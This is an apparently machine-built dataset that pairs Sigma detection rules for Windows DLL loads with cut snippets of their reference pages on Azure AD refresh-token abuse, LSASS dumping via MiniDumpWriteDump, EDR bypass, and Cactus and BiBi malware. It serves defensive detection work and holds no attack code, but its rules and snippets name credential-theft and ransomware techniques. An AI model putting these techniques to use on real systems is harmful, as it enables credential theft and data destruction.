{
  "0": {
    "url": "https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30",
    "markdown": "# Requesting Azure AD Request Tokens on Azure-AD-joined Machines for Browser SSO Jul 15, 2020 RequestAADRefreshToken is a tool that returns OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user. I discovered this feature while reading through the Azure AD documentation where it stated: > In Windows 10, Azure AD supports browser SSO in Internet Explorer and Microsoft",
    "sigma_rule": {
      "title": "Potential Azure Browser SSO Abuse",
      "id": "50f852e6-af22-4c78-9ede-42ef36aa3453",
      "status": "test",
      "description": "Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser.\nAn attacker can use this to authenticate to Azure AD in a browser as that user.\n",
      "references": [
        "https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30"
      ],
      "author": "Den Iuzvyk",
      "date": "2020-07-15",
      "modified": "2023-04-18",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1574.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded": "C:\\Windows\\System32\\MicrosoftAccountTokenProvider.dll"
        },
        "filter_main_bgtaskhost": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\"
          ],
          "Image|endswith": "\\BackgroundTaskHost.exe"
        },
        "filter_optional_devenv": {
          "Image|startswith": [
            "C:\\Program Files\\Microsoft Visual Studio\\",
            "C:\\Program Files (x86)\\Microsoft Visual Studio\\"
          ],
          "Image|endswith": "\\IDE\\devenv.exe"
        },
        "filter_optional_ie": {
          "Image": [
            "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe"
          ]
        },
        "filter_optional_edge_1": [
          {
            "Image|startswith": "C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\"
          },
          {
            "Image|endswith": "\\WindowsApps\\MicrosoftEdge.exe"
          },
          {
            "Image": [
              "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
              "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
            ]
          }
        ],
        "filter_optional_edge_2": {
          "Image|startswith": [
            "C:\\Program Files (x86)\\Microsoft\\EdgeCore\\",
            "C:\\Program Files\\Microsoft\\EdgeCore\\"
          ],
          "Image|endswith": [
            "\\msedge.exe",
            "\\msedgewebview2.exe"
          ]
        },
        "filter_optional_onedrive": {
          "Image|endswith": "\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"
        },
        "filter_optional_null": {
          "Image": null
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "False positives are expected since this rules is only looking for the DLL load event. This rule is better used in correlation with related activity"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_azure_microsoft_account_token_provider_dll_load.yml"
  },
  "1": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
    "markdown": "# MiniDumpWriteDump function (minidumpapiset.h) Writes user-mode minidump information to the specified file. ## Syntax ``` BOOL MiniDumpWriteDump( [in] HANDLE hProcess, [in] DWORD ProcessId, [in] HANDLE hFile, [in] MINIDUMP_TYPE DumpType, [in] PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, [in] PMINIDUMP_CALLBACK_INFORMATION CallbackParam ); ``` ## Parameters - **[in] hProcess** A handle to the process for which the information is to be generated. This handle must have `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ` access to the process. If handle information is to be collected then `PROCESS_DUP_HANDLE` access is also required. For more information, see Process Security and Access Rights. The caller must also be able to get `THREAD_ALL_ACCESS`",
    "sigma_rule": {
      "title": "Suspicious Unsigned Dbghelp/Dbgcore DLL Loaded",
      "id": "bdc64095-d59a-42a2-8588-71fd9c9d9abc",
      "related": [
        {
          "id": "0e277796-5f23-4e49-a490-483131d4f6e1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
        "https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html",
        "https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6"
      ],
      "author": "Perez Diego (@darkquassar), oscd.community, Ecco",
      "date": "2019-10-27",
      "modified": "2022-12-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\dbghelp.dll",
            "\\dbgcore.dll"
          ],
          "Signed": "false"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_dbghelp_dbgcore_unsigned_load.yml"
  },
  "2": {
    "url": "https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html",
    "markdown": "# MiniDumpWriteDump (dbghelp) ## Summary Writes user-mode minidump information to the specified file. ### C# Signature: ``` [DllImport(\"Dbghelp.dll\")] static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam); ``` ### VB Signature: ``` Declare Function MiniDumpWriteDump Lib \"Dbghelp.dll\" (TODO) As TODO ``` ### User-Defined Types: - MINIDUMP_EXCEPTION_INFORMATION ### Alternative Managed API: Do you know one? Please contribute it! ### Notes: None. ### Tips & Tricks: Please add some! ### Sample Code: ``` [DllImport(\"Dbghelp.dll\")] static extern bool MiniDumpWriteDump(IntPtr hProcess, uint ProcessId, IntPtr hFile, int DumpType, ref MINIDUMP_EXCEPTION_INFORMATION ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam); [DllImport(\"kernel32.dll\")]",
    "sigma_rule": {
      "title": "Suspicious Unsigned Dbghelp/Dbgcore DLL Loaded",
      "id": "bdc64095-d59a-42a2-8588-71fd9c9d9abc",
      "related": [
        {
          "id": "0e277796-5f23-4e49-a490-483131d4f6e1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
        "https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html",
        "https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6"
      ],
      "author": "Perez Diego (@darkquassar), oscd.community, Ecco",
      "date": "2019-10-27",
      "modified": "2022-12-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\dbghelp.dll",
            "\\dbgcore.dll"
          ],
          "Signed": "false"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_dbghelp_dbgcore_unsigned_load.yml"
  },
  "3": {
    "url": "https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6",
    "markdown": "# Bypass EDR’s memory protection, introduction to hooking *Jan 18, 2019* --- On a recent internal penetration engagement, I was faced against an EDR product that I will not name. This product greatly hindered my ability to access lsass’ memory and use our own custom flavor of Mimikatz to dump clear-text credentials. ```image Alt: For those who recommends ProcDump Description: The image is a screenshot of an endpoint detection and response (EDR) system's events log. It displays a table with several columns detailing an event detected on January 18, 2019. The table includes columns for 'When', 'Category', 'Event', and 'Details'.",
    "sigma_rule": {
      "title": "Suspicious Unsigned Dbghelp/Dbgcore DLL Loaded",
      "id": "bdc64095-d59a-42a2-8588-71fd9c9d9abc",
      "related": [
        {
          "id": "0e277796-5f23-4e49-a490-483131d4f6e1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes.\nTools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll.\nAs an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.\n",
      "references": [
        "https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump",
        "https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html",
        "https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6"
      ],
      "author": "Perez Diego (@darkquassar), oscd.community, Ecco",
      "date": "2019-10-27",
      "modified": "2022-12-09",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ImageLoaded|endswith": [
            "\\dbghelp.dll",
            "\\dbgcore.dll"
          ],
          "Signed": "false"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_dbghelp_dbgcore_unsigned_load.yml"
  },
  "4": {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By A Suspicious Process",
      "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
      "related": [
        {
          "id": "3669afd2-9891-4534-a626-e5cf03810a61",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "selection_folders_1": {
          "Image|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet"
          ]
        },
        "selection_folders_2": [
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "selection_img and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Processes related to software installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_suspicious_load.yml"
  },
  "5": {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By A Suspicious Process",
      "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
      "related": [
        {
          "id": "3669afd2-9891-4534-a626-e5cf03810a61",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "selection_folders_1": {
          "Image|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet"
          ]
        },
        "selection_folders_2": [
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "selection_img and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Processes related to software installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_suspicious_load.yml"
  },
  "6": {
    "url": "https://www.swascan.com/cactus-ransomware-malware-analysis/",
    "markdown": "# Cactus Ransomware: malware analysis ## **Important elements of the analysis:** - Attack vector with Fortinet VPN vulnerability - Auto-encryption of the ransomware itself to perform bypassing - Dynamic and consecutive changing of encrypted file extensions - UPX packing - OpenSSL, AES OCB, ChaCha20_Poly1305 algorithms - Scheduled tasks - Restart management executions - Enumeration of network shares - Using the `C:\\ProgramData\\ntuser.da` file for the public key of the auto-encryption - Encryption of files in buffers ## Introduction Cactus Ransomware is a new threat, first identified in March 2023, with some special characteristics. It is distributed in compromised infrastructures mainly using",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By A Suspicious Process",
      "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
      "related": [
        {
          "id": "3669afd2-9891-4534-a626-e5cf03810a61",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "selection_folders_1": {
          "Image|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet"
          ]
        },
        "selection_folders_2": [
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "selection_img and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Processes related to software installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_suspicious_load.yml"
  },
  "7": {
    "url": "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html",
    "markdown": "# Hamas hackers use data destruction software BiBi, which consumes a lot of processor resources to wipe Windows computer data | iThome **Category:** Business **Source:** Breaking News **Published:** 19th November 2023 --- Since the Palestinian militant group Hamas raided Israel in early October, triggering the Israeli-Palestinian conflict, hundreds of hacker organizations have expressed support for the two camps and expressed their demands through DDoS attacks on corporate organizations in hostile countries. However, there are also hacker groups that adopt more radical methods and cause more serious damage. At the end of October, security Joes disclosed the BiBi-Linux data destruction software",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By A Suspicious Process",
      "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
      "related": [
        {
          "id": "3669afd2-9891-4534-a626-e5cf03810a61",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "selection_folders_1": {
          "Image|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet"
          ]
        },
        "selection_folders_2": [
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "selection_img and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Processes related to software installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_suspicious_load.yml"
  },
  "8": {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By An Uncommon Process",
      "id": "3669afd2-9891-4534-a626-e5cf03810a61",
      "related": [
        {
          "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "filter_main_generic": {
          "Image|contains": [
            ":\\$WINDOWS.~BT\\",
            ":\\$WinREAgent\\",
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\",
            ":\\Windows\\explorer.exe",
            ":\\Windows\\SoftwareDistribution\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\",
            ":\\WUDownloadCache\\"
          ]
        },
        "filter_main_user_software_installations": {
          "Image|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-",
            ".tmp\\"
          ],
          "Image|endswith": ".tmp"
        },
        "filter_main_admin_software_installations": {
          "Image|contains": ":\\Windows\\Temp\\"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Other legitimate Windows processes not currently listed",
        "Processes related to software installation"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_uncommon_load.yml"
  },
  "9": {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By An Uncommon Process",
      "id": "3669afd2-9891-4534-a626-e5cf03810a61",
      "related": [
        {
          "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "filter_main_generic": {
          "Image|contains": [
            ":\\$WINDOWS.~BT\\",
            ":\\$WinREAgent\\",
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\",
            ":\\Windows\\explorer.exe",
            ":\\Windows\\SoftwareDistribution\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\",
            ":\\WUDownloadCache\\"
          ]
        },
        "filter_main_user_software_installations": {
          "Image|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-",
            ".tmp\\"
          ],
          "Image|endswith": ".tmp"
        },
        "filter_main_admin_software_installations": {
          "Image|contains": ":\\Windows\\Temp\\"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Other legitimate Windows processes not currently listed",
        "Processes related to software installation"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_uncommon_load.yml"
  },
  "10": {
    "url": "https://www.swascan.com/cactus-ransomware-malware-analysis/",
    "markdown": "# Cactus Ransomware: malware analysis ## **Important elements of the analysis:** - Attack vector with Fortinet VPN vulnerability - Auto-encryption of the ransomware itself to perform bypassing - Dynamic and consecutive changing of encrypted file extensions - UPX packing - OpenSSL, AES OCB, ChaCha20_Poly1305 algorithms - Scheduled tasks - Restart management executions - Enumeration of network shares - Using the `C:\\ProgramData\\ntuser.da` file for the public key of the auto-encryption - Encryption of files in buffers ## Introduction Cactus Ransomware is a new threat, first identified in March 2023, with some special characteristics. It is distributed in compromised infrastructures mainly using",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By An Uncommon Process",
      "id": "3669afd2-9891-4534-a626-e5cf03810a61",
      "related": [
        {
          "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "filter_main_generic": {
          "Image|contains": [
            ":\\$WINDOWS.~BT\\",
            ":\\$WinREAgent\\",
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\",
            ":\\Windows\\explorer.exe",
            ":\\Windows\\SoftwareDistribution\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\",
            ":\\WUDownloadCache\\"
          ]
        },
        "filter_main_user_software_installations": {
          "Image|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-",
            ".tmp\\"
          ],
          "Image|endswith": ".tmp"
        },
        "filter_main_admin_software_installations": {
          "Image|contains": ":\\Windows\\Temp\\"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Other legitimate Windows processes not currently listed",
        "Processes related to software installation"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_uncommon_load.yml"
  },
  "11": {
    "url": "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html",
    "markdown": "# Hamas hackers use data destruction software BiBi, which consumes a lot of processor resources to wipe Windows computer data | iThome **Category:** Business **Source:** Breaking News **Published:** 19th November 2023 --- Since the Palestinian militant group Hamas raided Israel in early October, triggering the Israeli-Palestinian conflict, hundreds of hacker organizations have expressed support for the two camps and expressed their demands through DDoS attacks on corporate organizations in hostile countries. However, there are also hacker groups that adopt more radical methods and cause more serious damage. At the end of October, security Joes disclosed the BiBi-Linux data destruction software",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By An Uncommon Process",
      "id": "3669afd2-9891-4534-a626-e5cf03810a61",
      "related": [
        {
          "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
